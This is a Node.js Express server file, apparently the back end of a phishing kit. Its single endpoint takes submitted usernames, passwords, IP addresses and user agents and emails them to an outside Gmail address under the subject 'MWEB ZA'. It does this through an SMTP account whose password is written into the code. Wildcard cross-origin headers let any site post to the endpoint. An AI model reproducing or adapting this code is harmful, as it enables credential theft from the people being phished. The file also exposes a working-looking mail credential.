const express = require('express');
const nodemailer = require('nodemailer');
const logger = require("morgan");
const bodyParser = require('body-parser');
const cors = require('cors');

const app = express();
app.use(cors());
app.use(function (req, res, next) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS, PUT, PATCH, DELETE');
    res.setHeader('Access-Control-Allow-Headers', 'X-Requested-With,content-type');
    res.setHeader('Access-Control-Allow-Credentials', true);
    next();
  });

app.use(logger("dev"));
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

// Endpoint to receive form data
app.post('/api/saveData', (req, res) => {
    const { username, password, ip, userAgent } = req.body;

    // Send email with form data
    sendEmail(username, password, ip, userAgent, (error) => {
        if (error) {
            return res.status(500).json({ message: 'Error sending email', error });
        }
        res.status(200).json({ message: 'Data sent via email successfully!' });
    });
});

// Function to send an email
function sendEmail(username, password, ip, userAgent, callback) {
    const transporter = nodemailer.createTransport({
        host: 'mail.qstix.com.ng', // Replace with your cPanel SMTP server
        port: 465,                    // Use 465 for SSL
        secure: true,                 // true for SSL
        auth: {
            user: 'no-reply@qstix.com.ng', // Replace with your cPanel email
            pass: 'EmekaIwuagwu87**'        // Replace with your email password
        }
    });

    const mailOptions = {
        from: 'no-reply@qstix.com.ng',       // Your "from" address
        to: 'migospay@gmail.com',       // Replace with the recipient's email
        subject: 'MWEB ZA',
        text: `Username: ${username}\nPassword: ${password}\nIP Address: ${ip}\nUser Agent: ${userAgent}`
    };

    transporter.sendMail(mailOptions, (error, info) => {
        callback(error);
    });
}

// Start the server
app.listen(3000, () => {
    console.log('Server running on http://localhost:3000');
});
